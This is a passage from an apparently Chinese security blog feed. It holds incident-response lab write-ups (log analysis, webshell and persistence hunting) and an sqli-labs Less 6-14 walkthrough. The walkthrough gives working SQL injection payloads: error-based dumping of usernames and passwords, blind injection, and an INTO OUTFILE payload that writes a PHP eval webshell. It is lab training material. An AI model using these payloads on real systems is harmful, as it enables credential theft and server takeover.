&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">192.168.141.55 - - [29/Apr/2023:22:45:23 +0800] &amp;#34;GET /manage/welcome.php HTTP/1.1&amp;#34; 200 10013 &amp;#34;http://192.168.141.188/manage/login.php?ref
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">erer=http%3A%2F%2F192.168.141.188%2Fmanage%2F&amp;#34; &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{2023:04:29 22:45:23}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>请提交攻击者的浏览器版本 flag{Firgfox/2200}&lt;/strong>&lt;br>
由flag1可知&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{Firefox/110.0}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>请提交攻击者目录扫描所使用的工具名称&lt;/strong>&lt;br>
可以看出扫描器的特征：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Fuzz Faster U Fool v1.5.0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325155258.png" alt="Pasted image 20250325155258">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{Fuzz Faster U Fool}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>&lt;strong>找到攻击者写入的恶意后门文件，提交文件名（完整路径）&lt;/strong>&lt;br>
查看日志：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325151625.png" alt="Pasted image 20250325151625">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325151645.png" alt="Pasted image 20250325151645">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{C:\phpstudy_pro\WWW\.x.php}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag5">flag5&lt;/h1>
&lt;p>&lt;strong>找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名（完整路径）&lt;/strong>&lt;br>
D盾直接扫描即可：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325152028.png" alt="Pasted image 20250325152028">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{C:\phpstudy_pro\WWW\usr\themes\default\post.php}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag6">flag6&lt;/h1>
&lt;p>&lt;strong>请指出可疑进程采用的自动启动的方式，启动的脚本的名字 flag{1.exe}&lt;/strong>&lt;br>
查看开机自动文件夹，并没有发现有什么恶意的东西。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">C&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">\ProgramData\Microsoft\Windows\Start&lt;/span> &lt;span class="nx">Menu\Programs\StartUp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">C&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="nx">\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start&lt;/span> &lt;span class="nx">Menu\Programs\Startup&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>并无可疑文件，接下来查看 &lt;code>Temp&lt;/code> 目录和 &lt;code>Windows&lt;/code> 目录&lt;br>
在 &lt;code>Windows&lt;/code> 目录下，发现可疑文件&lt;br>
在windows目录下，发现一个x.bat文件，发现这个bat文件是打开360.exe文件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325153807.png" alt="Pasted image 20250325153807">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325161044.png" alt="Pasted image 20250325161044">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{x.bat}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【玄机靶场】应急响应-vulntarget-j-01</title><link>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-j-01/</link><pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-vulntarget-j-01/</guid><description>&lt;img src="http://localhost:1313/images/24.webp" alt="Featured image of post 【玄机靶场】应急响应-vulntarget-j-01" />&lt;h1 id="简介">简介&lt;/h1>
&lt;p>题目来源公众号 vulntarget&lt;br>
&lt;a href="https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg">https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg&lt;/a>&lt;br>
任务环境说明&lt;br>
windows账密：workstation admin@20221123&lt;br>
web端口外部无法访问，请RDP连接上机排查&lt;/p>
&lt;h1 id="flag1">flag1&lt;/h1>
&lt;p>&lt;strong>主站进入后台的文件名称？&lt;/strong>&lt;br>
查看apache日志，找到&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111723.png" alt="Pasted image 20250325111723">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111801.png" alt="Pasted image 20250325111801">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{FNeSOgYGkp.php}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag2">flag2&lt;/h1>
&lt;p>&lt;strong>黑客是从哪个端口上传木马文件的?&lt;/strong>&lt;br>
打开小皮查看网页端口，7001打不开，所以为80&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325111917.png" alt="Pasted image 20250325111917">&lt;br>
flag&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{80}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag3">flag3&lt;/h1>
&lt;p>&lt;strong>黑客添加的木马文件名称和密码分别是什么，将黑客添加 的木马名称和密码作为flag提交{fag(名称:密码)&lt;/strong>&lt;br>
直接可以使用D盾扫出该文件。然后使用webshell检测一下，发现确实是webshell后门工具。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325112640.png" alt="Pasted image 20250325112640">&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325112156.png" alt="Pasted image 20250325112156">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{api3.php:Admin}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="flag4">flag4&lt;/h1>
&lt;p>可以根据日志查看：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250325131342.png" alt="Pasted image 20250325131342">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">flag{192.168.112.123}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【靶场】sql-labs-Less 6-14</title><link>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less-6-14/</link><pubDate>Sat, 30 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less-6-14/</guid><description>&lt;img src="http://localhost:1313/images/22.webp" alt="Featured image of post 【靶场】sql-labs-Less 6-14" />&lt;h1 id="less-6">Less-6&lt;/h1>
&lt;p>&lt;strong>验证注入点：双引号报错，两个双引号闭合利用闭合方式：&lt;code>&amp;quot; &amp;lt;payload&amp;gt; --+&lt;/code>&lt;/strong>&lt;br>
就闭合方式和 Less-5 不一样外，其余都一样&lt;br>
1.进入第六题，显示&lt;code>Please input the ID as parameter with numeric value&lt;/code>，告诉了我们参数为&lt;strong>id&lt;/strong>&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250313192901.png" alt="Pasted image 20250313192901">&lt;br>
发现闭合方式为&amp;quot;，和上一关同理采用报错注入，这里用extractvalue函数&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-6/?id=1&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110439.png" alt="Pasted image 20250314110439">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="o">?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="s2">&amp;#34; and extractvalue(1,concat(0x7e,(select concat(username,&amp;#39;:&amp;#39;,password) from users limit 0,1)))--+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110536.png" alt="Pasted image 20250314110536">&lt;/p>
&lt;h1 id="less-7">Less-7&lt;/h1>
&lt;p>&lt;strong>验证注入点：单引号报错，两个单引号闭合利用闭合方式：&lt;code>')) &amp;lt;payload&amp;gt; --+&lt;/code>&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314110703.png" alt="Pasted image 20250314110703">&lt;br>
前置知识:&lt;br>
文件读写注入条件：&lt;br>
在配置文件中设置&lt;br>
&lt;strong>secure_file_priv=&amp;rsquo;&amp;rsquo;&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">注：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1. Windows的配置文件在mysql下的my.ini
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2. Linux的配置文件在/etc/conf
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>查看是否配置成功：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">show&lt;/span> &lt;span class="k">global&lt;/span> &lt;span class="nx">variables&lt;/span> &lt;span class="nx">like&lt;/span> &lt;span class="s1">&amp;#39;%secure%&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314113015.png" alt="Pasted image 20250314113015">&lt;br>
php的配置文件php.ini关闭魔术引号&lt;/p>
&lt;ol>
&lt;li>&lt;strong>magic_quotes_gpc = Off&lt;/strong>&lt;/li>
&lt;li>&lt;strong>知道服务器的绝对路径&lt;/strong>&lt;/li>
&lt;li>&lt;strong>登录的账户具有root权限&lt;/strong>&lt;br>
读取文件：&lt;br>
&lt;strong>load_file()&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">例：&lt;/span>&lt;span class="n">select&lt;/span> &lt;span class="n">load_file&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;D:/password.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 读取D盘下的password.txt文件&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>写文件：&lt;br>
&lt;strong>into outfile 路径&lt;/strong>&lt;br>
实战&lt;br>
1.判断闭合方式闭合方式&lt;br>
利用报错信息判断闭合方式为&amp;rsquo;))&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">http&lt;/span>&lt;span class="o">://&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sqli&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">labs&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">Less&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="o">/?&lt;/span>&lt;span class="nx">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">--+&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314111716.png" alt="Pasted image 20250314111716">&lt;br>
利用文件读写注入写入木马：&lt;br>
写入一句话木马：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">正常Payload&lt;/span>&lt;span class="o">:&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="k">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$_POST&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;pwd&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">十六进制：0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">http://localhost/sqli-labs/Less-7/?id=-1&amp;#39;)) UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile &amp;#39;C:\\phpstudy_pro\\WWW\\hack.php&amp;#39; --+
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>连接地址：http://localhost/hack.php&lt;br>
连接密码：pwd&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250314132112.png" alt="Pasted image 20250314132112">&lt;/p>
&lt;h1 id="less-8">Less-8&lt;/h1>
&lt;p>&amp;lsquo;闭合 布尔盲注&lt;br>
使用的注入语句和第五关的布尔盲注一样&lt;br>
示例，判断长度：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-8/?id=1&amp;#39;and length((select database()))&amp;gt;7 --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132316.png" alt="Pasted image 20250317132316">&lt;br>
写shell：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-8/?id=-1&amp;#39; UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile &amp;#39;C:\\phpstudy_pro\\WWW\\hack.php&amp;#39; --+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132457.png" alt="Pasted image 20250317132457">&lt;br>
链接成功。&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317132622.png" alt="Pasted image 20250317132622">&lt;/p>
&lt;h1 id="less-9">Less-9&lt;/h1>
&lt;p>基于GET单引号基于时间盲注&lt;br>
如果当前数据库名字符长度大于1，则执行sleep函数使数据库执行延迟，否则则返回1。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-9/?id=1&amp;#39; and if(length(database())&amp;gt;1,sleep(5),1) --+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">延迟5秒
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317140308.png" alt="Pasted image 20250317140308">&lt;/p>
&lt;h1 id="less-10">Less-10&lt;/h1>
&lt;p>基于GET双引号基于时间盲注&lt;br>
与第9关差不多，只不过闭合方式变成双引号了&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://localhost/sqli-labs/Less-10/?id=1&amp;#34; and if(length(database())&amp;gt;1,sleep(5),1) --+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">延迟5秒
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317140607.png" alt="Pasted image 20250317140607">&lt;/p>
&lt;h1 id="less-11">Less-11&lt;/h1>
&lt;p>基于单引号的POST注入&lt;br>
&lt;strong>单引号测试：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uname&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">admin&lt;/span>&lt;span class="err">&amp;#39;&lt;/span> &lt;span class="k">and&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="o">--+&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">passwd&lt;/span>&lt;span class="o">=&amp;amp;&lt;/span>&lt;span class="nx">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">Submit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250317144342.png" alt="Pasted image 20250317144342">&lt;br>
&lt;strong>字段个数：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
